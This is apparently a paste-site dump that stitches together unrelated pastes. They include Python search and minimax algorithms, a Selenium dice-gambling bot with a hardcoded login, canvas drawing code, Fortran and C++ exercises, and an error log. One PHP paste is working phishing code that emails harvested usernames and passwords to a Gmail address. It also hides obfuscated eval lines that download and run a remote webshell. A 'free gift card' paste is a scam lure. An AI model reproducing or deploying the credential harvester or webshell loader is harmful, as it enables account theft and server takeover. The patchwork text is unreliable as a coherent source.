#NOTE that Gready_best_search depends on H_cost only
graph={
    'S':[('A',1),('B',4)],
    'A':[('B',2),('C',5),('G',12)],
    'B':[('C',2)],
    'C':[('G',3)]
}
# The hurestic of each node
H_table={
    'S':7,
    'A':6,
    'B':4,
    'C':2,
    'G':0
}
#To calculate the H_cost of any path
def path_h_cost(path):
    for (node,cost) in path:
       last_node = path[-1][0] #C
       h_cost = H_table[last_node] #2
    return h_cost , last_node    

#to check the path_h_cost function
# path=[('S', 0), ('A', 1), ('C', 5)] 
# print(path_f_cost (path))
#SOLUTION = (2 , C)

def gready_best_search(graph, start, goal):

    visited=[]
    queue=[[(start,0)]]

    while queue:

        queue.sort(key=path_h_cost) #sorting by least f-cost
        path = queue.pop(0) #pop from left
        node = path[-1][0] 
        if node in visited:
            continue
        visited.append(node) 
        if node == goal:
             return path
        else:
            adjacent_nodes = graph.get(node,[])                             
            for (adjacent_node,cost) in adjacent_nodes:
                new_path =path.copy() 
                new_path.append((adjacent_node, cost))
                queue.append(new_path)


solution= gready_best_search(graph, 'S', 'G')
print('Solution is : ', solution)
solution_path = [node for (node,_) in solution] #_ to ignore the cost of nodes
print('The path of Solution : ', solution_path)
print('H_cost of solution is', path_h_cost(solution)[0])

#5-A*
#NOTE that a* depends on F_cost = G_cost + H_cost

graph={
    'S':[('A',1),('B',4)],
    'A':[('B',2),('C',5),('G',12)],
    'B':[('C',2)],
    'C':[('G',3)]
}
# The hurestic of each node
H_table={
    'S':7,
    'A':6,
    'B':4,
    'C':2,
    'G':0
}

#To calculate the F_cost of any path
def path_f_cost(path):
    g_cost= 0
    for (node,cost) in path:
        g_cost += cost
    last_node = path[-1][0] #C
    h_cost = H_table[last_node] #2
    f_cost = g_cost + h_cost
    return f_cost , last_node    

#to check the path_f_cost function
# path=[('S', 0), ('A', 1), ('C', 5)] 
# print(path_f_cost (path))
#SOLUTION = (8 , C)

def a_star_search(graph, start, goal):

    visited=[]
    queue=[[(start,0)]]

    while queue:

        queue.sort(key=path_f_cost) #sorting by least f-cost
        path = queue.pop(0) #pop from left
        node = path[-1][0] 
        if node in visited:
            continue
        visited.append(node) 
        if node == goal:
             return path
        else:
            adjacent_nodes = graph.get(node,[])                             
            for (adjacent_node,cost) in adjacent_nodes:
                new_path =path.copy() 
                new_path.append((adjacent_node, cost))
                queue.append(new_path)


solution= a_star_search(graph, 'S', 'G')
print('Solution is : ', solution)
solution_path = [node for (node,_) in solution] #_ to ignore the cost of nodes
print('The path of Solution : ', solution_path)
print('F_cost of solution is', path_f_cost(solution)[0])

#6-UCS

#NOTE that Uniform_cost_search depends on G_cost of path

#create a function to calculate path_cost
def path_cost(path):
    total_cost = 0
    for (node , cost) in path:
        total_cost += cost
    return total_cost , path[-1][0]

#declaring the graph as a dictionary with it's cost
graph = {
  'S' : [ ('A',2),('B',3),('D',5)],
  'A' : [('C',4)],
  'B' : [('D',4)],
  'C' : [('D',1),('G',2)],
  'D' : [('G',5)],
  'G' : []
}
def ucs(graph, start, goal):
    #create a list to store the visited nodes and a queue to store the nodes
    visited = []
    queue = [[(start,0)]]
    
    #loop through the queue if it's not empty
    while queue:
        queue.sort(key=path_cost) #sorting by lowest path_cost
        path = queue.pop(0)
        node = path[-1][0]

        if node in visited:
            continue
        visited.append(node)
        if node == goal:
            return path
        else:
            adjacent_nodes = graph.get(node, [])
            for (adjacent_node,cost) in adjacent_nodes:
                new_path = path.copy()
                new_path.append((adjacent_node,cost))
                queue.append(new_path)
    return print(""The queue is empty, no solution found."")

solution = ucs(graph,'S','G')
print('Solution is ' , solution)
print('Cost of solution is ' , path_cost(solution)[0])

#7-MinMax

import math
def Minmax(cd,node,maxt,scr,td):
    if(cd==td):
        return scr[node]
    if(maxt):
        return max(Minmax(cd+1,node*2,False,scr,td),Minmax(cd+1,node*2+1,False,scr,td))
    else:
        return min(Minmax(cd+1,node*2,True,scr,td),Minmax(cd+1,node*2+1,True,scr,td))
    
    
scr=[]
x=int(input('Enter Total Nymber of leaf node= '))
for i in range (x):
    y=int(input('Enter leaf value: '))
    scr.append(y)



td=math.log(len(scr),2)
cd=int(input('Enter current depth value: '))
nodev=int(input('Enter node value: '))
maxt=True
print('The answer is : ',end="" "")
answer=Minmax(cd,nodev,maxt,scr,td)
print(answer)





"
xrK7uJsf,snowybot.py,coinwalk,JavaScript,Sunday 12th of May 2024 10:25:01 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
import lambda_function 
import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
 
sys.setrecursionlimit(1000000000)
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options) 
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""iamsnow"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""future"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = 0.0001
fart = 1
base = 0.0001
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.9)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
HScPesN9,DrawPath.js,Sonnet_Songbird,JavaScript,Sunday 12th of May 2024 09:26:43 PM CDT,"// const canvas = document.getElementById(""canvasView"");
// const ctx = canvas.getContext(""2d""); 필요.
// 캔버스에 대해 전처리 알고리즘이 필요하면 const canvasPostprocessing = () => {}

//


const clearCanvas = function (canvas) {
    const ctx = canvas.getContext('2d');
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    if (typeof canvasPostprocessing !== 'undefined') {
        canvasPostprocessing(canvas);
    }
}

const findPath = function () {
    // 각 정점간의 연결을 나타내는 path를 시작점에서부터 끝점까지 순서대로 담은 배열을 반환 
};

const drawPath = function () {
    const path = findPath();
    if (path.length === 0) {
        return false;
    }

    drawRouteAnimated(path, ""red"", 3, (500 + path.length * 200)); // path배열, 색상, 두께, duration
    return true;
};


//offset은 캔버스 객체의 데이터셋에 담아서 설정
const toCoordinate = function () {
    const position = ("""")//path를 통해 정점을 가리키는 매개면수를 받아 좌표 정보를 가진 정점을 찾아옴
    let offsetX = 0;
    let offsetY = 0;
    if (canvas.dataset.offsetX) {
        offsetX = canvas.dataset.offsetX;
    }
    if (canvas.dataset.offsetY) {
        offsetY = canvas.dataset.offsetY;
    }
    return position ? {x: position.x + Number(offsetX), y: position.y + Number(offsetY)} : null;
    //정점의 좌표 정보(예시에선 position.x / position.y가 존재한다고 간주)에 offSet을 더함. 
};

const drawAllRoutes = function () {
    clearCanvas(canvas);
    navRepo2D.pathRepo.forEach(function (route) {
        drawRoute([route.posA, route.posB], ""black"", 1);
    });
};
const drawRoute = function (path, color, width) {
    ctx.strokeStyle = color;
    ctx.lineWidth = width;

    ctx.beginPath();
    for (let i = 0; i < path.length - 1; i++) {
        const startPos = toCoordinate(path[i]);
        const endPos = toCoordinate(path[i + 1]);
        if (startPos && endPos) {
            ctx.moveTo(startPos.x, startPos.y);
            ctx.lineTo(endPos.x, endPos.y);
        }
    }
    ctx.stroke();
};

const drawPartialRoute = function (startPos, endPos, color, width, partialLength) {
    const segmentLength = Math.sqrt((endPos.x - startPos.x) ** 2 + (endPos.y - startPos.y) ** 2);
    const ratio = partialLength / segmentLength;
    const partialEndX = startPos.x + (endPos.x - startPos.x) * ratio;
    const partialEndY = startPos.y + (endPos.y - startPos.y) * ratio;
    ctx.strokeStyle = color;
    ctx.lineWidth = width;
    ctx.beginPath();
    ctx.moveTo(startPos.x, startPos.y);
    ctx.lineTo(partialEndX, partialEndY);
    ctx.stroke();
};

const drawRouteAnimated = function (path, color, width, duration) {
    let startTime = null;
    const totalLength = calcLength(path);
    const animateDraw = function (currentTime) {
        if (!startTime) startTime = currentTime;
        let progress = Math.min(1, (currentTime - startTime) / duration);
        const partialLength = progress * totalLength;

        clearCanvas(canvas);
        if (!canvas.dataset.noAllRoutes) {
            drawAllRoutes();
        }
        let remainingLength = partialLength;
        for (let i = 0; i < path.length - 1; i++) {
            const startPos = toCoordinate(path[i]);
            const endPos = toCoordinate(path[i + 1]);
            const segmentLength = calcLength([path[i], path[i + 1]]);
            if (remainingLength >= segmentLength) {
                drawPartialRoute(startPos, endPos, color, width, segmentLength);
                remainingLength -= segmentLength;
            } else {
                const ratio = remainingLength / segmentLength;
                const partialEndPos = {
                    x: startPos.x + (endPos.x - startPos.x) * ratio,
                    y: startPos.y + (endPos.y - startPos.y) * ratio
                };
                drawPartialRoute(startPos, partialEndPos, color, width, remainingLength);
                break;
            }
        }
        if (progress < 1) {
            requestAnimationFrame(animateDraw);
        }
    };
    requestAnimationFrame(animateDraw);
};

const calcLength = function (path) {
    let totalLength = 0;
    for (let i = 0; i < path.length - 1; i++) {
        const startPos = toCoordinate(path[i]);
        const endPos = toCoordinate(path[i + 1]);
        if (startPos && endPos) {
            totalLength += Math.sqrt((endPos.x - startPos.x) ** 2 + (endPos.y - startPos.y) ** 2);
        }
    }
    return totalLength;
};
"
q57aHUXy,snowybot.py,coinwalk,JavaScript,Sunday 12th of May 2024 08:57:49 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""iamsnow"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""future"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = 0.00000001
fart = 1
base = 0.00000001
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.1)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
qrUmnuv1,magic_square_sums,Python253,Python,Sunday 12th of May 2024 08:47:08 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: magic_square_sums.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script efficiently generates magic squares and computes the sum of each row, column, and diagonal for specified dimension ranges. Key points include:

    Magic Square Generation:
        - The script uses the Siamese method to generate magic squares of various dimensions.

    Sum Calculation:
        - It calculates the sum of each row, column, and diagonal within the generated magic squares.

    User Interface:
        - The script provides a user-friendly menu interface for selecting predefined dimension ranges.

    Terminal Output:
        - It displays the sums of rows, columns, and diagonals to the terminal for the selected dimension range.

    File Saving Option:
        - Additionally, users have the option to save the output data to a file. The filename is dynamically generated based on the selected dimension range.

Requirements:
    - Python3.x

Functions:
    1. magic_square(n): This function generates a magic square of dimension 'n x n' using the Siamese method.
    It calculates the sum of each row, column, and diagonal within the square and returns a formatted string indicating the dimensions & sums of the magic squares in range.

Usage:
    - Run the script in a Python environment.
    - Follow the on-screen prompts to select an option from the menu and input the desired dimension range.
    - The script will then generate magic squares for all odd dimensions within the specified range and display the sums of each row/column/diagonal to the terminal.
    - Optionally, the user can choose to save the output data to a file in the current working directory.

Additional Notes:
    - The script supports predefined dimension ranges ranging from 3x3 to 999x999.
    - Magic squares for dimensions less than 3 or even dimensions are not supported.
    - The sum of each row/column/diagonal is calculated and displayed for each generated magic square.
    - Output data can be saved to a file with a dynamically generated filename based on the selected dimension range.
""""""

import os

# Function to create Magic Square
def magic_square(n):
    if n < 3:
        return ""- Magic squares for dimensions less than 3 are not supported by this algorithm!\n""
    elif n % 2 == 0:
        return ""- Even dimension values are not supported by this algorithm!\n""

    # Initialize the magic square with zeros
    magicSquare = []
    for i in range(n):
        listt = []
        for j in range(n):
            listt.append(0)
        magicSquare.append(listt)

    # Initialize starting position
    i = n // 2
    j = n - 1

    # Set the number of elements to insert
    num = n * n
    count = 1

    # Populate the magic square
    while count <= num:
        if i == -1 and j == n:  # condition 4
            j = n - 2
            i = 0
        else:
            if j == n:  # column value is exceeding
                j = 0

            if i < 0:  # row  is becoming -1
                i = n - 1

        # Check if cell is occupied
        if magicSquare[i][j] != 0:
            j = j - 2
            i = i + 1
            continue

        else:
            magicSquare[i][j] = count
            count += 1

        # Move to the next cell
        i = i - 1
        j = j + 1  # condition 1

    # Calculate the sum of each row, column, and diagonal
    row_sums = [sum(row) for row in magicSquare]
    col_sums = [sum(col) for col in zip(*magicSquare)]
    diagonal_sum_1 = sum(magicSquare[i][i] for i in range(n))
    diagonal_sum_2 = sum(magicSquare[i][n - i - 1] for i in range(n))

    return f""The magic square {n}x{n} sum of each row/column/diagonal is: {sum(row_sums)}\n""

if __name__ == ""__main__"":
    """"""
    Main function to execute the script.
    """"""
    print(""   :: MAGIC SQUARES GENERATOR ::\n"")
    print(""\t:: Options Menu :"")
    print(""    ___________________________\n"")
    print(""    Option 1:     3x3 - 9x9"")
    print(""    Option 2:   11x11 - 31x31"")
    print(""    Option 3:   33x33 - 99x99"")
    print(""    Option 4: 101x101 - 315x315"")
    print(""    Option 5: 317x317 - 999x999"")  # This Option Will Take Some Time
    print(""    Option 6: !SHOW ALL RANGES!"")  # This Option Will Take Alot Of Time
    print(""    ___________________________"")

    option = int(input(""\n    Enter the option number: ""))
    output_data = """"
    start_range = 0
    end_range = 0

    if option == 1:
        start_range = 3
        end_range = 9
    elif option == 2:
        start_range = 11
        end_range = 31
    elif option == 3:
        start_range = 33
        end_range = 99
    elif option == 4:
        start_range = 101
        end_range = 315
    elif option == 5:
        print(
            ""\n\tThis Option Will Take Some Time...\n\tThank You For Your Patience!\n""
        )
        start_range = 317
        end_range = 999
    elif option == 6:
        print(
            ""\n\tThis Option Will Take Alot Of Time...\n\tThank You For Your Patience!\n""
        )
        start_range = 3
        end_range = 999
    else:
        print(""\nInvalid option selected!\n"")

    for n in range(start_range, end_range + 1, 2):
        output_data += magic_square(n)

    print(output_data)

    # Save the output sums of the given ranges to a dynamically named file in the curent working directory
    save_file = input(
        ""\nDo you want to save the output to a file?\n\n1: Yes\n2: No\n\nMake your selection (1 or 2): ""
    )
    if save_file == ""1"":
        file_name = (
            f""magic_square_{start_range}x{start_range}_to_{end_range}x{end_range}.txt""
        )
        with open(file_name, ""w"") as file:
            file.write(output_data)
        print(f""Output saved to {file_name} in the current directory!\n"")
    elif save_file == ""2"":
        print(""\nOutput not saved!\n"")
    else:
        print(""\nInvalid input. Output not saved!\n"")

"
ELEre1a5,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Sunday 12th of May 2024 08:41:27 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
13 May 2024"
7Ss62UmS,Backrooms Code Requester,iNxmi,Lua,Sunday 12th of May 2024 08:35:14 PM CDT,"local socket = require ""socket""
 
function getCode(id, location)
	local id, protocol, table = socket.request(id, nil, {location = location})
    return table[""code""]
end

return {
	getCode = getCode
}"
m3itbF8w,Backrooms Code Server,iNxmi,Lua,Sunday 12th of May 2024 08:31:56 PM CDT,"local socket = require ""socket""
 
function generateCode()
    local request = http.get(
        ""https://www.random.org/integers/?num=4&min=0&max=9&col=1&base=10&format=plain&rnd=new""
    )
 
    local text = request.readAll()
 
    return string.gsub(text, ""\n"", """")
end
 
local codes = {
    pool_door = generateCode()
}
print(textutils.serializeJSON(codes))
 
function response(id, protocol, table)
    local location = table[""location""]
    return codes[location]
end
 
while true do 
    print(""Listening on port "" .. os.computerID())
    
    local id, protocol, table = socket.receive()
    print(string.format(""id=%s protocol=%s table=%s"", id, protocol, table))
    local response = response(id, protocol, table)
    
    local data = {success = false, error = ""bad request""}
    if response ~= nil then
        data = {success = true, code = response}
    end
    
    print(data)
    socket.send(id, ""code"", data)
end
 
print(""Server stopped"")"
90aKF1YC,Degree_row_module,Oppaceted,Fortran,Sunday 12th of May 2024 08:27:45 PM CDT,"module Degree_row_module
    contains
    !
    subroutine output(string,x,n,y,d)
        integer :: string,i
        integer :: n(string)
        real(8) :: x(string),y(string),d(string)
        character(len = 72) :: cap = '+----+----------+------+----------+---------------+'
        write (*,'(a)') cap
        write (*,'(a)') '|  i |    x{i}  | n{i} |   y{i}   |      d{i}     |'
        do i = 1,string
            write (*,'(a)') cap
            write (*,'(a, i3, a, f10.6, a, i6, a, f10.6, a, es15.6, a)') '|', i, ' |', x(i), '|', n(i), '|', y(i),'|',d(i),'|'
        end do
        write (*,'(a)') cap
    end subroutine
    !
    subroutine ryad(str, x, n, y, d, E)
        integer :: str
        real(8) :: x(str), y(str), d(str)
        integer :: n(str)
        integer :: i
        real(8) :: E, ui
        do i =1, str
            n(i) = 0
            y(i) = log(2.0d0)
            ui = -1.0d0
            do while ( (abs(ui) >= (E * abs( y(i) ) ) ) .and. (n(i)<2500) )
                n(i) = n(i) + 1
                ui = -ui*x(i)*(0.5d0)
                y(i) = y(i) + ui/n(i)
            end do
            d(i) = abs( y(i)-log(x(i) + 2.0) )
        end do
    end subroutine
end module
"
1WkQuUHR,main,Oppaceted,Fortran,Sunday 12th of May 2024 08:26:55 PM CDT,"!
program main
    use Degree_row_module
    implicit none
    integer :: str, i
    integer, allocatable :: n(:)
    real(8), allocatable :: x(:), y(:), d(:)
    real(8) :: low, high
    real(8), parameter :: E = 1.0e-15
    !
    write (*,'(a$)') 'Enter number of strings: '
    read (*,*) str
    write (*,'(a$)') 'Enter low and high: '
    read (*,*) low, high
    !
    allocate(n(str))
    allocate(x(str))
    allocate(y(str))
    allocate(d(str))
    !
    n(:) = 0
    d(:) = 0.0d0
    y(:) = 0.0d0
    do i =1,str
        x(i) = low + ( ( (high-low)/(str-1) )*(i-1) )
    end do
    call ryad(str,x,n,y,d,E)
    call output(str,x,n,y,d)
    deallocate(n)
    deallocate(x)
    deallocate(y)
    deallocate(d)
end program main
"
yjHTQq7d,ejer2bis_tp6,orlandoju,C++,Sunday 12th of May 2024 08:10:21 PM CDT,"#include <iostream>
#include <clocale>
using namespace std;

/* Hacer un programa donde se carguen 15 números enteros y luego le solicite al usuario un número e indique si el mismo pertenece a la lista cargada anteriormente.*/

 int main(){
    setlocale(LC_ALL, """");
    int const NUMS = 5;
    int vec_num[NUMS];
    int num;
    bool num_encontrado = false;
    for(int i =0 ; i<NUMS ; i++){
    cout <<""(""<< i + 1 <<"")""<< "" Ingrese un número: "";
        cin >> vec_num[i];
    }
    cout<<endl<<endl;
    cout <<""Ingrese un número para verificar si se encuentra en el listado proporcionado: ""<<endl;
    cin >>num;
    for(int j=0 ; j<NUMS ; j++){
        if(vec_num[j]== num){
            cout<< vec_num[j]<<"" de la posición ""<< j+1 <<"" coincide con un número de la lista""<<endl;
            //cout<<"","";
            num_encontrado= true;
        }
    }
    if (!num_encontrado){
    cout<<""No hay coincidencias"";
    }


    return 0;
    }"
MVmKSu2J,ejer1bis_tp6,orlandoju,C++,Sunday 12th of May 2024 08:09:40 PM CDT,"#include <iostream>
using namespace std;
#include <clocale>

/*Hacer un programa que le pida al usuario una lista de 10 números enteros y luego de ingresarlos muestre cuáles de ellos fueron positivos.*/

 int main(){
    setlocale(LC_ALL, """");
    int const NUMS = 5;
    int vec_num[NUMS];
    bool num_pos = false;
    for(int i =0 ; i<NUMS ; i++){
    cout <<""(""<< i + 1 <<"")""<< "" Ingrese un número""<<endl;
        cin >> vec_num[i];
    }

    cout<< ""Los números positivos son: ""<<endl;

    for(int j=0 ; j<NUMS ; j++){
        if(vec_num[j]>0){
            if(num_pos = true){
            //cout<< ""Los números positivos son: "" << endl << vec_num[j]<< ""de la posición ""<< vec_num[j]+1<< endl;
            cout<< vec_num[j]<<"" de la posición ""<< j+1 <<endl;
            //cout<<"","";
            num_pos= true;
            }

       }
    }
    if (!num_pos){
    cout<<""No hay positivos"";
    }
    return 0;
    }"
NibJ3Jwk,php,blackhat1337,PHP,Sunday 12th of May 2024 08:06:36 PM CDT,"<?php

$subjek = 'RESUL';
$mailto = 'muhrazky@gmail.com'; //masukin email lo disini

//////////////////////////////////////

$user = $_POST['log'];
$pass = $_POST['pwd'];

//////////////////////////////////////

$body = <<<EOD
<br><hr><br>
<center><font size=""4"" ;"" color=""red"">RESULT LOG ADMIN!<br></font>
<font size=""2"" color=""red"">Username\Email :</font><font size""2"" color=""black"">$user</font><br>
<font size=""2"" color=""red"">Password : </font><font size""2"" color=""black"">$pass</font> <br></center>
EOD;

$headers = ""From: muhrazky@gmail.com\r\n"";
$headers .= ""Content-type: text/html\r\n"";
$success = mail($mailto, $subjek, $body, $headers);
?>
<?php
$random = rand(1000,5000);
?>

<?php eval(""?>"".file_get_contents(""https://raw.githubusercontent.com/exploit-haxor/webshell/main/zz.php""));/**/?>""));?>

<?=/****/@null; /********/ /*******/ /********/@eval/****/(""?>"".file_get_contents/*******/(""https://raw.githubusercontent.com/exploit-haxor/webshell/main/zz.php""));/**/?>"
stP1tZPW,Untitled,rosander,Lua,Sunday 12th of May 2024 07:42:56 PM CDT,"2024-05-12 19:02:12.979 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:341: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:02:12.979 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:359: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:02:12.979 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
